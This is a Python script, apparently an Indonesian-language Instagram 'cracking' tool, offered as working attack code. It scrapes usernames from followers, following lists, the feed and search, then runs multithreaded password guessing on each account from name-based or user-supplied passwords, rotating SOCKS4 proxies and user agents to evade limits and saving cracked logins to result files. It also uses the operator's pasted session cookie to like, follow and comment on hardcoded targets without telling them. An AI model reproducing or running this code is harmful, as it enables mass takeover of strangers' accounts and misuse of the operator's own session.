import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Logo
___logo___ = (f"""{H}""")
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    ___cookie = input(f"{P}[{H}$${P}]{P} Cookie :{H} ")
    if ___cookie in ['exit', 'Exit', 'EXIT']:
        exit(f"{P}[{M}**{P}]{M} BYEEEEE... !")
    elif ___cookie in ['', ' ']:
        exit(f"{P}[{M}!{P}]{M} JANGAN KOSONG !")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            print(f"{H}[{P}*{H}]{P} Hi :{K} {___roz['full_name']} Welcome !");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{M} MOHON GUNAKAN COOKIE NEW !")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{K} KONEKSI ERROR !")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hello And Welcome ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{P}[{H}*{P}]{P} SUCCES LOGIN");___menu___()
            else:
                print(f"{P}[{M}*{P}]{M} COOKIE INVALID !");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
    except Exception as e:
        print(f"{P}[{M}*{P}]{M} COOKIE INVALID !");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['user']
        print(f"{P}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"{B}┃{P} You name instagram :{K} {___roz['full_name']}          ┃")
        print(f"{B}┃{P} Username instagram :{K} {___roz['username']} ┃")
        print(f"{B}┃{P} Follower instagram :{K} {___roz['follower_count']}            ┃")
        print(f"{P}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);___login___()
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{P}[{K}!{P}]{K} Connection Error")
    print(f"{P}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print(f"{P}┃ NO ┃ PILIHAN MENU CRACKING ┃ STATUS ┃")
    print(f"{P}┡━━━━╇━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━┩")
    print(f"{P}│ {P}01{B} │{P} Dumps insta followers │   {H}ON{P}   │")
    print(f"{P}│ {P}02{B} │{P} Dumps insta following │   {H}ON{P}   │")
    print(f"{P}│ {P}03{B} │{P} Dumps insta beranda   │   {H}ON{P}   │")
    print(f"{P}│ {P}04{B} │{P} Dumps insta pencarian │   {H}ON{P}   │")
    print(f"{P}│ {P}05{B} │{H} Start Cracking{P}        │   {H}ON{P}   │")
    print(f"{P}│ {P}06{P} │{P} Result Account {H}OK{P}-{K}CP{P}  │ {H}  •{K}•{P}   │")
    print(f"{P}│ {P}00{P} │{M} Logout {P}& {M}Remove Cokie{P} │   {M}••{P}   │")
    print(f"{P}└────┴───────────────────────┴────────┘")
    ___pilih = input(f"{P}Choose :{K} ")
    if ___pilih in ['1','01']:
        ___pengikut___()
    elif ___pilih in ['2','02']:
        ___mengikuti___()
    elif ___pilih in ['3','03']:
        ___beranda___()
    elif ___pilih in ['4','04']:
        ___search___()
    elif ___pilih in ['5','05']:
        ___proxy___()
    elif ___pilih in ['6','06']:
        try:
            print(f"\n{H}[{P}1{H}]{P} Total Ok")
            print(f"{H}[{P}2{H}]{P} Total Cp")
            print(f"{H}[{P}3{H}]{P} Return\n")
            ___hasil = input(f"{B}[{P}?{B}]{P} Choose :{K} ")
            if ___hasil in ['1','01']:
                print(f"{P} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{P} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                exit(f"{P}[{M}!{P}]{M} Wrong Input")
        except:pass
    elif ___pilih in ['0','00']:
        print(f"{P}[{K}!{P}]{K} Delete Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');exit()
    else:
        exit(f"{P}[{K}!{P}]{M} Wrong Input")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"\n{P}[{H}*{P}]{P} USERNAME :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}*{P}]{M} MOHON GUNAKAN USERNAME !")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{P}[{H}*{P}]{P} COPY FILE :{K} Dump/{___file}")
            input(f"{K}[{P}TEKAN ENTER{K}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}*{P}]{M} GAGAL DUMP !")
    except (ConnectionError):
        exit(f"{P}[{M}*{P}]{M} KONEKSI INTERNET ERROR !")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{P} USERNAME :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}*{P}]{M} MOHON GUNAKAN USERNAME !")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{P}[{H}*{P}]{P} NAMA :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{H}{z['username']}{P}<=>{H}{z['full_name']}")
            print(f"{P}[{P}•{P}]{P} COPY FILE :{H} Dump/{___file}")
            input(f"{M}[{P}TEKAN ENTER{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}*{P}]{M} GAGAL DUMP !")
    except (ConnectionError):
        exit(f"{P}[{M}*{P}]{M} KONEKSI INTERNET ERROR !")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{H}[{P}?{H}]{P} NAMA FILE :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}*{P}]{M} JANGAN KOSONG KONTOL !")
        else:
            print(f"{P} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{H}{z['user']['username']}{P} [/] {H}{z['user']['full_name']}")
            print(f"{P}[{H}•{P}]{P} COPY FILE :{K} Dump/{___file}")
            input(f"{M}[{P}TEKAN ENTER{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}*{P}]{M} GAGAL DUMP !")
    except (ConnectionError):
        exit(f"{P}[{M}*{P}]{M} KONEKSI INTERNET ERROR !")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{P} USERNAME :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}*{P}]{M} MOHON GUNAKAN USERNAME !")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{P}[{H}*{P}]{P} NAMA :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{H}{z['username']}{P}<=>{H}{z['full_name']}")
            print(f"{H}[{P}•{H}]{P} COPY FILE :{H} Dump/{___file}")
            input(f"{P}[{K}TEKAN ENTER{P}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}*{P}]{M} GAGAL DUMP !")
    except (ConnectionError):
        exit(f"{P}[{M}*{P}]{M} KONEKSI INTERNET ERROR !")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"\n{H}[{P}1{H}]{P} GUNAKAN PASSWORD BAWAAN {K}")
        print(f"{H}[{P}2{H}]{P} GUNAKAN PASSWORD MANUAL {K}\n")
        ___pilih = input(f"{B}[{P}?{B}]{P} Choose :{H} ")
        if ___pilih in ['2','02']:
            pwx = input(f"{B}[{P}•{B}]{P} PASSWORD :{H} ").split(',')
        try:
            self.___dump = input(f"{B}[{P}?{B}]{P} FILES :{H} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            exit(f"{P}[{M}!{P}]{M} FILE TIDAK ADA CIL !")
        try:
            print(f"\n{H}[{P}•{H}]{P} RESULT OK TERSIMPAN DI > Results/Ok.txt")
            print(f"{H}[{P}•{H}]{P} RESULT CP TERSIMPAN DI > Results/Cp.txt\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'321']
                    elif ___pilih in ['2','02']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{M}[{P}SELESAI{M}]{P}")
        except (ValueError):
            exit(f"{P}[{M}!{P}]{M} Crack is complete, there seems to be an error, please re-dump!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{B}[{P}✔{B}]{P} Status :{H} Tonye Success     ")
                        print(f"{B}[{P}>{B}]{P} Username :{H} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{H} {following}")
                        print(f"{B}[{P}>{B}]{P} Cookie :{H} {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{B}[{P}✘{B}]{P} Status :{K} Tonye Checkpoint    ")
                        print(f"{B}[{P}>{B}]{P} Username :{K} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{K} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{K} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{K} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{P}[{M}!{P}]{M} Gunakan Mode Pesawat 5 Detik !", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{P}[{P}Crack{P}]{P} {self.kill}/{str(len(user))} Cp:-{len(self.cp)} Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{P}[{K}!{P}]{K} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    ___menu___()

